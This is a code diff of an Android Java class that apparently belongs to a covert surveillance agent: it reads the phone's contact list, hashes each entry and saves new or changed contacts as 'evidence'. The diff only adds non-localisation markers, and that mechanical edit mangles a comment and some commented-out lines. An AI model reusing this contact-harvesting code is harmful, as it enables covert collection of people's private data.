@@ -31,7 +31,7 @@ import com.android.service.util.Utils;
 import com.android.service.util.WChar;
 
 public class AgentTask extends AgentBase {
-	private static final String TAG = "AgentAddressbook";
+	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
 	private PickContact contact;
 
 	Markup markup;
@@ -64,7 +64,7 @@ public class AgentTask extends AgentBase {
 				contacts = (HashMap<Long, Long>) markup.readMarkupSerializable();
 			} catch (final IOException e) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (begin): cannot read markup");
+					Check.log(TAG + " Error (begin): cannot read markup") ;//$NON-NLS-1$
 				}
 			}
 		}
@@ -81,23 +81,23 @@ public class AgentTask extends AgentBase {
 	 */
 	private void serializeContacts() {
 		if (Cfg.DEBUG) {
-			Check.ensures(contacts != null, "null contacts");
+			Check.ensures(contacts != null, "null contacts"); //$NON-NLS-1$
 		}
 
 		try {
 			final boolean ret = markup.writeMarkupSerializable(contacts);
 			if (Cfg.DEBUG) {
-				Check.ensures(ret, "cannot serialize");
+				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
 			}
 		} catch (final IOException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (serializeContacts): " + e);
+				Check.log(TAG + " Error (serializeContacts): " + e) ;//$NON-NLS-1$
 			}
 		}
 	}
 
 	/**
-	 * Every once and then read the contactInfo, and check every change. If
+	 * Every once and then read the contactInfo, and Check.every change. If //$NON-NLS-1$
 	 * something is new the contact is saved.
 	 */
 	@Override
@@ -108,10 +108,10 @@ public class AgentTask extends AgentBase {
 		final List<Contact> list = contact.getContactInfo();
 		final Date after = new Date();
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000);
+			Check.log(TAG + " (go): get contact time s " + (after.getTime() - before.getTime()) / 1000) ;//$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (go): list size = " + list.size());
+			Check.log(TAG + " (go): list size = " + list.size()) ;//$NON-NLS-1$
 		}
 
 		final ListIterator<Contact> iter = list.listIterator();
@@ -124,17 +124,17 @@ public class AgentTask extends AgentBase {
 
 			// calculate the crc of the contact
 			final byte[] packet = preparePacket(c);
-			// if(Cfg.DEBUG) Check.log( TAG + " (go): " +
+			// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
 			// Utils.byteArrayToHex(packet));
 			final Long crcOld = contacts.get(c.getId());
 			final Long crcNew = Encryption.CRC32(packet);
-			// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> " +
+			// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
 			// crcNew);
 
 			// if does not match, save and serialize
 			if (!crcNew.equals(crcOld)) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (go): new contact. " + c);
+					Check.log(TAG + " (go): new contact. " + c) ;//$NON-NLS-1$
 				}
 				contacts.put(c.getId(), crcNew);
 				saveEvidence(c);
@@ -145,7 +145,7 @@ public class AgentTask extends AgentBase {
 
 		if (needToSerialize) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): serialize contacts");
+				Check.log(TAG + " (go): serialize contacts") ;//$NON-NLS-1$
 			}
 			serializeContacts();
 		}
@@ -196,7 +196,7 @@ public class AgentTask extends AgentBase {
 			addTypedString(outputStream, (byte) 0x07, number);
 		}
 		addTypedString(outputStream, (byte) 0x37, message);
-		// if(Cfg.DEBUG) Check.log( TAG + " (preparePacket): " + uid + " " +
+		// if(Cfg.DEBUG) Check.log( TAG + " (preparePacket): " + uid + " "  ;//$NON-NLS-1$
 		// name);
 
 		final byte[] payload = outputStream.toByteArray();
@@ -210,15 +210,15 @@ public class AgentTask extends AgentBase {
 		db_header.writeInt((int) uid);
 
 		if (Cfg.DEBUG) {
-			Check.asserts(header.length == 12, "getContactPayload header.length: " + header.length);
+			Check.asserts(header.length == 12, "getContactPayload header.length: " + header.length); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.asserts(db_header.getPosition() == 12, "getContactPayload db_header.getLength: " + header.length);
+			Check.asserts(db_header.getPosition() == 12, "getContactPayload db_header.getLength: " + header.length); //$NON-NLS-1$
 		}
 
 		final byte[] packet = Utils.concat(header, 12, payload, payload.length);
 		if (Cfg.DEBUG) {
-			Check.ensures(packet.length == size, "getContactPayload packet.length: " + packet.length);
+			Check.ensures(packet.length == size, "getContactPayload packet.length: " + packet.length); //$NON-NLS-1$
 		}
 		return packet;
 	}
@@ -232,10 +232,10 @@ public class AgentTask extends AgentBase {
 				outputStream.write(WChar.getBytes(name, false));
 			} catch (final IOException e) {
 				if (Cfg.DEBUG) {
-					Check.log(e);
+					Check.log(e) ;//$NON-NLS-1$
 				}
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error (addTypedString): " + e);
+					Check.log(TAG + " Error (addTypedString): " + e) ;//$NON-NLS-1$
 				}
 			}
 		}
